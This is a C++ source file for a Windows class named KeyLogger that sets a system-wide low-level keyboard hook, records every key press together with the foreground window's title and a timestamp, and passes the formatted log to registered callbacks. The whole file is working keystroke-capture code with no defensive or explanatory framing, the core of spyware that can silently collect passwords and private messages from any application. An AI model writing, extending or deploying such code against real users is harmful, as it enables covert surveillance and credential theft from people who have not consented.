#include "KeyLogger.h"

#include <chrono>
#include <iomanip>

#include "Format.h"
#include "PressedKey.h"
#include "Trace.h"

std::mutex KeyLogger::_instancesLock;
std::vector<KeyLogger*> KeyLogger::_instances;
std::unique_ptr<IOperationQueue> KeyLogger::_queue = CreateOperationQueue();
wil::unique_hhook KeyLogger::_hook;
std::string KeyLogger::_lastWindowTitle;

KeyLogger::KeyLogger(
	const OnKeyLog& onKeyLog
) :
	_onKeyLog(onKeyLog)
{
	std::lock_guard guard(_instancesLock);

	if (_instances.empty())
	{
		const auto windowsHook = SetWindowsHookEx(
			WH_KEYBOARD_LL,
			&KeyLogger::HookCallback,
			nullptr,
			0);

		_hook.reset(windowsHook);
	}

	_instances.push_back(this);
}

KeyLogger::~KeyLogger()
{
	std::lock_guard guard(_instancesLock);

	std::erase_if(
		_instances, 
		[&](const KeyLogger* k) { return this == k; });

	if (_instances.empty())
	{
		_hook.reset();
	}
}

LRESULT KeyLogger::HookCallback(const int nCode, const WPARAM wParam, const LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN)
	{
		_queue->Add([=] { Callback(lParam); });
	}

	return CallNextHookEx(_hook.get(), nCode, wParam, lParam);
}

void KeyLogger::Callback(const LPARAM lParam)
{
	const auto keyboardEvent = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

	const std::string log = GetLog(keyboardEvent.vkCode);

	std::lock_guard guard(_instancesLock);

	for (const auto& instance : _instances)
	{
		instance->_onKeyLog(log);
	}
}

std::string KeyLogger::GetLog(const int keyStroke)
{
	std::stringstream output;

	const auto foregroundWindow = wil::unique_hwnd(GetForegroundWindow());
	const auto layout = GetKeyboardLayout(foregroundWindow.get());
	const auto prefix = GetWindowPrefix(foregroundWindow.get());

	output << prefix;

	const auto pressedKey = PressedKey(keyStroke, layout);
	output << pressedKey.ToString();

	return output.str();
}

std::string KeyLogger::GetWindowTitle(const HWND windowHandle)
{
	auto windowTitle = std::string(GetWindowTextLength(windowHandle) + 1, L'\0');

	GetWindowTextA(windowHandle, &windowTitle[0], windowTitle.size());

	return windowTitle;
}

HKL KeyLogger::GetKeyboardLayout(const HWND windowHandle)
{
	const DWORD threadId = GetWindowThreadProcessId(windowHandle, nullptr);

	return ::GetKeyboardLayout(threadId);
}

std::string KeyLogger::GetWindowPrefix(const HWND windowHandle)
{
	const std::string windowTitle = GetWindowTitle(windowHandle);

	if (_lastWindowTitle != windowTitle)
	{
		_lastWindowTitle = windowTitle;

		const std::string formattedTime = FormatDate(std::chrono::system_clock::now());

		return Format("[Window: %s - at %s]\n", windowTitle.c_str(), formattedTime.c_str());
	}

	return "";
}

std::string KeyLogger::FormatDate(const std::chrono::system_clock::time_point time)
{
	const std::time_t timeT = std::chrono::system_clock::to_time_t(time);

	std::string formattedString(30, '\0');

	tm timeInfo;
	localtime_s(&timeInfo, &timeT);

	std::strftime(
		&formattedString[0],
		formattedString.size(),
		"%Y-%m-%d %H:%M:%S",
		&timeInfo);

	return formattedString;
}
